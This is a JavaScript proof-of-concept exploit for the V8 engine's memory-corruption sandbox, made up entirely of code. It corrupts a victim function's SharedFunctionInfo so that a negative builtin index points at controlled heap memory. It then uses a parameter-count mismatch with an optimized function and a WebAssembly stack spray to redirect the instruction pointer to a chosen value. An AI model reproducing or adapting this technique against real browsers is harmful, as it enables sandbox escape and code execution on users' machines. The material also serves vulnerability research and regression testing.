const kHeapObjectTag = 0x1;
const kSmiTagSize = 0x1;
const kSelfIndirectPointerOffset = 0x4;
const kParameterCountOffset = 0x3c;
const kJSFunctionType = Sandbox.getInstanceTypeIdFor("JS_FUNCTION_TYPE");
const kSharedFunctionInfoOffset = Sandbox.getFieldOffset(kJSFunctionType, "shared_function_info");
const kSharedFunctionInfoType = Sandbox.getInstanceTypeIdFor("SHARED_FUNCTION_INFO_TYPE");
const kFormalParameterCountOffset = Sandbox.getFieldOffset(kSharedFunctionInfoType, "formal_parameter_count");
const kTrustedFunctionDataOffset = Sandbox.getFieldOffset(kSharedFunctionInfoType, "trusted_function_data");
const kUnstrustedFunctionDataOffset = Sandbox.getFieldOffset(kSharedFunctionInfoType, "function_data");

const imbalancer = (a0,a1,a2,a3,a4,a5,a6,a7,a8,a9,a10,a11,a12,a13,a14) => {};
%PrepareFunctionForOptimization(imbalancer);
imbalancer();
%OptimizeFunctionOnNextCall(imbalancer);
imbalancer();
const imbalancerCodeHandle = 0x380001;

const memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
const getPtr = (obj) => Sandbox.getAddressOf(obj) + kHeapObjectTag;
const getField = (ptr, offset) => memory.getUint32(ptr + offset - kHeapObjectTag, true);
const setField = (ptr, offset, value) => memory.setUint32(ptr + offset - kHeapObjectTag, value, true);
const setField16 = (ptr, offset, value) => memory.setUint16(ptr + offset - kHeapObjectTag, value, true);

const victim = () => {};

// from test/mjsunit/sandbox/regress-430960844.js
let spray_mod = new WebAssembly.Module(new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 24, 2, 96, 16, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 126, 0, 96, 1, 126, 0, 2, 15, 1, 2, 106, 115, 8, 115, 112, 114, 97, 121, 95, 99, 98, 0, 0, 3, 2, 1, 1, 7, 9, 1, 5, 115, 112, 114, 97, 121, 0, 1, 10, 38, 1, 36, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 32, 0, 16, 0, 11]));
let { spray } = new WebAssembly.Instance(spray_mod, { js: { spray_cb: () => { } } }).exports;

const DESIRED_RIP = 0x424242424242n;
const pwn = () => {
    victim();
    spray(DESIRED_RIP);
};
%PrepareFunctionForOptimization(pwn);
pwn();
%OptimizeMaglevOnNextCall(pwn);
pwn();

Sandbox.setFunctionCodeToBuiltin(victim, Sandbox.getBuiltinNames().indexOf("DebugBreakTrampoline"));
const sfiPtr = getField(getPtr(victim), kSharedFunctionInfoOffset)
const victimParameterCount = memory.getUint16(
    sfiPtr + kFormalParameterCountOffset - kHeapObjectTag,
    true
);
setField(sfiPtr, kTrustedFunctionDataOffset, 0);
// builtins[builtinIdx] == builtinCodePtr == &(some Script in writable heap)
const [builtinIdx, builtinCodePtr] = [-0x101f, 0x800011];
setField(sfiPtr, kUnstrustedFunctionDataOffset, (builtinIdx << kSmiTagSize));
setField(builtinCodePtr, kSelfIndirectPointerOffset, imbalancerCodeHandle);
setField16(builtinCodePtr, kParameterCountOffset, victimParameterCount);

spray(DESIRED_RIP);
pwn();
